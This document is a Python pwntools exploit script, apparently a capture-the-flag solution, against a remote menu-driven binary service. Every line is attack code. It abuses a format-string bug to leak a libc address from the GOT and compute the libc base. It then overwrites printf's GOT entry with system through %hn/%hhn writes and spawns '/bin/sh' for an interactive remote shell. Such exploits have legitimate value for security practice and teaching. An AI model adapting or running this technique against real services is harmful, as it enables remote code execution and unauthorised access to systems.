from pwn import *
#libc = ELF('/usr/lib/libc.so.6', checksec=False)
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so', checksec=False)
elf = ELF('./challenge', checksec=False)
def add(data):
    p.sendlineafter('> ', '1')
    p.sendlineafter('add?', str(data))

def edit(idx, data):
    p.sendlineafter('> ', '3')
    p.sendlineafter('item?', str(idx))
    p.sendlineafter('value?', str(data))
    return p.recvline_contains('New Value').strip().split(' ')[-1]


#p = elf.process()
p = remote('jh2i.com', 50002)

add(p64(elf.got['puts']) + '\x00')                      # 1 => 10+(64 * 0)

add(p64(elf.got['printf'])+p64(elf.got['printf']+2))    # 2 => 10+(64 * 1)

leak = u64(edit(2, '%{:d}$s'.format(10+(64 * 0))).ljust(8, '\x00'))
libc.address = leak - libc.sym['puts']

log.info('puts   : 0x%x'%leak)
log.info('printf : 0x%x'%libc.sym['printf'])
log.info('system : 0x%x'%libc.sym['system'])
log.info('base   : 0x%x'%libc.address)


addr_1 = eval('0x' + hex(libc.sym['system'])[-4:])  
addr_2 = eval('0x' + hex(libc.sym['system'])[-8:-4])

payload = ''.join([
    '%{:d}x'.format(addr_1),   '%{:d}$hn'.format(10+(64 * 1)+0),
    '%{:d}x'.format(addr_2-addr_1),      '%{:d}$hhn'.format(10+(64 * 1)+1),
])

edit(2, payload)

p.send('3\n1\n/bin/sh\n')
p.clean()
p.interactive()